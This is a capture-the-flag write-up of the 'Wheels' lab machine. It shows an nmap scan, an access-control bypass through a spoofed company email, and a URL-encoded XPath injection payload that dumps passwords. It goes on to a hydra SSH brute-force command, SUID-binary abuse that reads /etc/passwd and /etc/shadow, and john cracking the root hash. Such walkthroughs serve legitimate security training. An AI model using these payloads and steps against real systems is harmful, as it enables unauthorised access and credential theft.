<h2>Recon</h2>
<h3>PortScan</h3>

>command used:sudo nmap -A -p- -T4 -v 

```
# Nmap 7.93 scan initiated Thu Feb  2 08:44:49 2023 as: nmap -A -v -T4 -oN wheels 192.168.102.202
Nmap scan report for 192.168.102.202
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Wheels - Car Repair Services
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/2%OT=22%CT=1%CU=31940%PV=Y%DS=2%DC=T%G=Y%TM=63DB6A18
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%II=I%TS=A)OPS(O1=M5
OS:4EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O
OS:6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T1(R=N)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T5(R=N)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   268.27 ms 192.168.49.1
2   268.31 ms 192.168.102.202

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  2 08:45:28 2023 -- 1 IP address (1 host up) scanned in 39.09 seconds
```
We have 2 ports opened here, port 22 which runs ssh and port 80 which runs http. So, our enumeration will be focused more on port 80.


<h2>Enumeration</h2>

Going to the webpage should get you this

![image](https://user-images.githubusercontent.com/67879936/222130410-04fcecfc-fcf6-43dc-a46e-1b1b50a3b401.png)

This web page runs a Wheels CarService, lets try to register an account to see if we can login to the web application

![image](https://user-images.githubusercontent.com/67879936/222131549-907be999-ab3c-4b0a-95fc-25c56765e67c.png)

Now, lets try to login after creating our account

![image](https://user-images.githubusercontent.com/67879936/222132098-077cb8a7-d253-48eb-b64c-cdad86ec3b1c.png)

But clicking on the login button and clicking on "Employee Portal" we get the _Access Denied_ error

![image](https://user-images.githubusercontent.com/67879936/222132237-52fd9ca8-e35c-471d-8298-40eb326bc6ec.png)

![image](https://user-images.githubusercontent.com/67879936/222145030-8971a88e-f46d-4282-a39b-50c55ff8564f.png)

Looking at the footer of the webpage

![image](https://user-images.githubusercontent.com/67879936/222133059-69501d18-14e5-4254-9c96-306c83d696e0.png)

The email here is _info@wheels.service_ lets go ahead and copy this same format for our mail since the mail won't get any verification code or link

![image](https://user-images.githubusercontent.com/67879936/222133634-42b4ff0c-021a-4f1e-90de-dbbaa3a20071.png)

Now, lets try to login

![image](https://user-images.githubusercontent.com/67879936/222143739-4cba672c-3848-450d-9f5f-d9170d0a4a53.png)

![image](https://user-images.githubusercontent.com/67879936/222143902-1353b56f-2a8a-424c-9525-08964d8f859b.png)

Now lets click on "Employee Portal" to see if we have access to view it

![image](https://user-images.githubusercontent.com/67879936/222145406-4c119937-7c6a-4d26-997d-6fc041bdacaa.png)

Alright we now have access to view the _/portal.php_ page

Lets capture the search request on burpsuite

![image](https://user-images.githubusercontent.com/67879936/222146261-05e4741f-734f-42ae-ae3d-96859b3d12ae.png)

![image](https://user-images.githubusercontent.com/67879936/222146616-e52c83fe-3bfd-451d-aa7b-e30976e926e0.png)

Sending this request to burp repeater

![image](https://user-images.githubusercontent.com/67879936/222147321-fa4f107a-bc8b-4dbf-a4be-11adf498c49a.png)

We'll be replacing the word "car" to another word, lets say "lorry"

![image](https://user-images.githubusercontent.com/67879936/222147806-d861929e-e282-48e8-bb79-7fcd923bb537.png)

Now, we got an XML error. This looks like a potential XPATH injection


<h2>Exploitation</h2>

>XPath injection is a type of cyber attack where an attacker inserts malicious code into a web application's XPath query. This can lead to unauthorized access, data theft, and other security breaches. The attacker can manipulate the query to access sensitive information or execute arbitrary commands. It is similar to SQL injection but targets XPath queries instead of SQL queries.

Now lets look for a payload that will help us harvest users passwords

>payload used: %27)%5D/password%20%7C%20a%5Bcontains(a,%27

![image](https://user-images.githubusercontent.com/67879936/222152476-d3a6d10d-851e-4316-93d1-afa0504ee302.png)

Lets open this response in our browser

![image](https://user-images.githubusercontent.com/67879936/222152682-cbf84433-fa44-4779-a110-24fc96be8ec3.png)

Now, we got a bunch of passwords, earlier while we were snooping around the webpage I could recall we saw some usernames when we clicked on the search button

![image](https://user-images.githubusercontent.com/67879936/222153084-3b278052-3dd1-4542-9d15-89fd638a0d0a.png)

![image](https://user-images.githubusercontent.com/67879936/222153292-730e2c90-68bc-41f0-864e-dae01e068a35.png)

What do we have so far??

port 22 which runs ssh, bunch of usernames and also passwords.

What comes to mind with these informations we've gathered so far??? Bruteforcing for ssh credentials using hydra hehe

save the usernames and passwords in different files, then we use hydra to bruteforce ssh creds

>command:hydra -L users.txt  -P passwords.txt ssh://192.168.82.202

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
└─$ hydra -L users.txt -P passwords.txt ssh://192.168.82.202 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-01 14:39:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ssh://192.168.82.202:22/
[22][ssh] host: 192.168.82.202   login: bob   password: Iamrockinginmyroom1212
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-01 14:40:09
```
Alright, so we got the username and password for ssh login. Lets go ahead and login using these creds

>command:ssh bob@192.168.82.202

![image](https://user-images.githubusercontent.com/67879936/222156690-558d55be-2f25-48d1-be72-91620fe48268.png)

Now that we are in lets go ahead and escalate our privileges


<h2>Privilege Escalation</h2>

Searching for suid files available on the machine, I found something interesting

>command:find / -perm -u=s -type f 2>/dev/null

![image](https://user-images.githubusercontent.com/67879936/222158397-52f50297-4c22-4716-8d9a-9901dac0a8ce.png)

Going to the highlighted directory

![image](https://user-images.githubusercontent.com/67879936/222159350-53fbe2b8-b2c9-4778-ae2a-e7cf9cd62a79.png)

The file is an executable, lets go ahead and check what it does

![image](https://user-images.githubusercontent.com/67879936/222160659-9d744b8a-2e1a-40ba-a4c4-e2da7e81dfcc.png)

So, this executable gives us an option to choose the file to open, either the "customers" list or the "employees" list. If you input something different you get the "oops something went wrong" error

Another thing this program does is that it filters out ```&``` ```|``` ```;``` if these symbols are present the program immediately terminates. If they aren't present the program checks if the "employee" and "customers" options are available, if they aren't the program returns the "oops something went wrong" error

To exploit this we'll be using the ```#``` symbol to comment out the file employee so that during the file read the program won't read the employee file

![image](https://user-images.githubusercontent.com/67879936/222168410-4e7ed1da-4a3e-4885-a6d6-fc4e67351a76.png)

cool, so now we can read the _/etc/passwd_ file. Lets try to read the  _/etc/shadow_ file also

![image](https://user-images.githubusercontent.com/67879936/222169171-386efe12-f3da-4665-9776-fd49b20163d1.png)

Now, that we can view the  _/etc/shadow_ file, we can go ahead to crack the hash. We'll be using John (my best buddy xD) to do crack this

>command:john hash --wordlist=/home/bl4ck4non/Documents/rockyou.txt

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
└─$ nano hash     
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
└─$ cat hash           
root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
└─$ john hash --wordlist=/home/bl4ck4non/Documents/rockyou.txt                                                                        
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
highschoolmusical (root)     
1g 0:00:00:03 DONE (2023-03-01 15:33) 0.2777g/s 1848p/s 1848c/s 1848C/s horoscope..aditya
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We got the root password, now lets go ahead and switch user to root

![image](https://user-images.githubusercontent.com/67879936/222171372-7d85a5d1-e00b-4817-aa22-f121b3f229b2.png)

Boom!!! We got the root shell

That will be all for now




























